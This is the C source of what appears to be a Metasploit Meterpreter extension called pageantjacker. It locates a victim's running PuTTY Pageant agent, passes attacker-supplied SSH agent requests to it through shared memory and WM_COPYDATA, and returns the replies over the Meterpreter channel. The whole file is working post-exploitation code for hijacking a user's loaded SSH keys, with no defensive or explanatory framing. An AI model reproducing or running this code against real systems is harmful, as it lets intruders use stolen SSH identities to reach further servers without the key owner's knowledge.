/*!
 * @file pageantjacker.c
 * @brief Entry point and intialisation functionality for the pageantjacker extention.
 */
#include "extapi.h"
#include "pageantjacker.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Results from the pageant query function
typedef struct pageant_query_results {
	BOOL result;
	unsigned int errorMessage;
	byte *blob;
	DWORD bloblength;
} PAGEANTQUERYRESULTS;

// Class and window name
#define PAGEANT_NAME L"Pageant"

#define PAGEANTJACKER_ERROR_NOERROR 0
#define PAGEANTJACKER_ERROR_SENDMESSAGE 1
#define PAGEANTJACKER_ERROR_MAPVIEWOFFILE 2
#define PAGEANTJACKER_ERROR_CREATEFILEMAPPING 3
#define PAGEANTJACKER_ERROR_ALLOC 4
#define PAGEANTJACKER_ERROR_REQSTRINGBUILD 5
#define PAGEANTJACKER_ERROR_NOTFOUND 6
#define PAGEANTJACKER_ERROR_NOTFORWARDED 7

#define AGENT_MAX 8192
#define AGENT_COPYDATA_ID 0x804e50ba
#define PAGENT_REQUEST_LENGTH 23

DWORD get_length_response(byte *b) {
	return (b[3]) | (b[2] << 8) | (b[1] << 16) | (b[0] << 24);
}

void send_query_to_pageant(byte *query, unsigned int querylength, PAGEANTQUERYRESULTS *ret) {

	// This will always be 23 chars. Initialised to zero here = no memset()
	char strPuttyRequest[PAGENT_REQUEST_LENGTH] = { 0 };
	COPYDATASTRUCT pageant_copy_data;
	unsigned char *filemap_pointer = NULL;
	HANDLE filemap = NULL;
	HWND hPageant = NULL;
	unsigned int protocol_return_length = 0;
	unsigned int api_result = 0;

	// Initialise the results arrays
	ret->result = FALSE;
	ret->errorMessage = PAGEANTJACKER_ERROR_NOERROR;

	hPageant = FindWindowW(PAGEANT_NAME, PAGEANT_NAME);
	if (hPageant == NULL) {
		// Could not get a handle to Pageant. This probably means that it is not running.
		ret->errorMessage = PAGEANTJACKER_ERROR_NOTFOUND;
		return;
	}

	dprintf("[PJ(send_query_to_pageant)] Pageant Handle is %x", hPageant);

	// Generate the request string and populate the struct
	if (_snprintf_s((char *)&strPuttyRequest,
	    sizeof(strPuttyRequest), _TRUNCATE, "PageantRequest%08x",
	    (unsigned int)GetCurrentThreadId()) <= 0)
	{
		// _snprintf_s failed. Note that this should never happen because it could
		// mean that somehow %08x has lost its meaning. Essentially though this is
		// here to guard against buffer overflows.
		ret->errorMessage = PAGEANTJACKER_ERROR_REQSTRINGBUILD;
		return;
	}

	pageant_copy_data.dwData = AGENT_COPYDATA_ID;
	pageant_copy_data.cbData = sizeof(strPuttyRequest);
	pageant_copy_data.lpData = &strPuttyRequest;
	dprintf("[PJ(send_query_to_pageant)] Request string is at 0x%p (%s)",
	    &pageant_copy_data.lpData, pageant_copy_data.lpData);

	// Pageant effectively communicates with PuTTY using
	// shared memory (in this case, a pagefile backed
	// memory allocation).
	// It will overwrite this memory block with the result
	// of the query.
	filemap = CreateFileMappingA(INVALID_HANDLE_VALUE,
		NULL, PAGE_READWRITE, 0, AGENT_MAX, (char *)
		&strPuttyRequest);
	if (filemap == NULL || filemap == INVALID_HANDLE_VALUE) {
		ret->errorMessage = PAGEANTJACKER_ERROR_CREATEFILEMAPPING;
		goto out;
	}

	dprintf("[PJ(send_query_to_pageant)] CreateFileMappingA returned 0x%x", filemap);
	filemap_pointer = MapViewOfFile(filemap, FILE_MAP_WRITE, 0, 0, 0);
	if (filemap_pointer == NULL) {
		ret->errorMessage = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
		goto out;
	}

	dprintf("[PJ(send_query_to_pageant)] MapViewOfFile returned 0x%x", filemap_pointer);

	dprintf("going to copy %u bytes of %p to %p", querylength, query, filemap_pointer);
	// Initialise and copy the request to the memory block that will be passed to Pageant.
	SecureZeroMemory(filemap_pointer, AGENT_MAX);
	if (querylength) {
		memcpy(filemap_pointer, query, querylength);
	}
	dprintf("copied");

	dprintf("[PJ(send_query_to_pageant)] Request length: %d. "
		"Query buffer: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X. "
		"Request buffer: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X",
		querylength,
		query[0], query[1], query[2], query[3], query[4], query[5], query[6], query[7],
		filemap_pointer[0],
		filemap_pointer[1],
		filemap_pointer[2],
		filemap_pointer[3],
		filemap_pointer[4],
		filemap_pointer[5],
		filemap_pointer[6],
		filemap_pointer[7]);

	// Send the request message to Pageant.
	dprintf("[PJ(send_query_to_pageant)] Ready to send WM_COPYDATA");
	SetLastError(ERROR_SUCCESS);
	SendMessage(hPageant, WM_COPYDATA, (WPARAM) NULL, (LPARAM) &pageant_copy_data);
	if (GetLastError() != ERROR_SUCCESS) {
		// SendMessage failed
		ret->errorMessage = PAGEANTJACKER_ERROR_SENDMESSAGE;
		goto out;
	}

	protocol_return_length = get_length_response(filemap_pointer) + 4;
	dprintf("[PJ(send_query_to_pageant)] Result length: %d. "
		"Result buffer: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X",
		protocol_return_length,
		filemap_pointer[0],
		filemap_pointer[1],
		filemap_pointer[2],
		filemap_pointer[3],
		filemap_pointer[4],
		filemap_pointer[5],
		filemap_pointer[6],
		filemap_pointer[7]);

	if (protocol_return_length && protocol_return_length < AGENT_MAX) {
		ret->blob = calloc(1, protocol_return_length);
		if (ret->blob == NULL) {
			dprintf("[PJ(send_query_to_pageant)] Malloc error (length: %d).", protocol_return_length);
			ret->errorMessage = PAGEANTJACKER_ERROR_ALLOC;
			goto out;
		}

		memcpy(ret->blob, filemap_pointer, protocol_return_length);
		ret->bloblength = protocol_return_length;
		ret->result = TRUE;
	}

out:
	if (filemap_pointer) {
		api_result = UnmapViewOfFile(filemap_pointer);
		dprintf("[PJ(send_query_to_pageant)] UnmapViewOfFile returns %d.", api_result);
	}

	if (filemap) {
		api_result = CloseHandle(filemap);
		dprintf("[PJ(send_query_to_pageant)] CloseHandle (from CreateFileMapping) returns %d.", api_result);
	}
}

DWORD request_pageant_send_query(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD rawDataSizeIn = 0;
	Byte *rawDataIn = NULL;
	PAGEANTQUERYRESULTS results = { 0 };

	// Retrieve from metasploit
	rawDataSizeIn = packet_get_tlv_value_uint(packet, TLV_TYPE_EXT_PAGEANT_SIZE_IN);
	rawDataIn = packet_get_tlv_value_raw(packet, TLV_TYPE_EXT_PAGEANT_BLOB_IN);

	dprintf("[PJ(request_pageant_send_query)] Size in: %d. Data is at 0x%p", rawDataSizeIn, rawDataIn);

	// Make sure that the length marker can never go above AGENT_MAX (i.e. prevent a stack based buffer overflow later)
	if (rawDataSizeIn >= AGENT_MAX) {
		rawDataSizeIn = AGENT_MAX - 1;
	}

	// Interact with Pageant. Note that this will always return a struct, even if the operation failed.
	dprintf("[PJ(request_pageant_send_query)] Forwarding query to Pageant");
	send_query_to_pageant(rawDataIn, rawDataSizeIn, (PAGEANTQUERYRESULTS *) &results);

	// Build the packet based on the respones from the Pageant interaction.
	packet_add_tlv_bool(response, TLV_TYPE_EXT_PAGEANT_STATUS, results.result);
	packet_add_tlv_raw(response, TLV_TYPE_EXT_PAGEANT_RETURNEDBLOB, results.blob, results.bloblength);
	packet_add_tlv_uint(response, TLV_TYPE_EXT_PAGEANT_ERRORMESSAGE, results.errorMessage);
	dprintf("[PJ(request_pageant_send_query)] Success: %d. Return data len "
		"%d, data is at 0x%p. Error message at 0x%p (%d)",
		results.result, results.bloblength, results.blob,
		&results.errorMessage, results.errorMessage);

	free(results.blob);

	// Transmit the packet to metasploit
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}
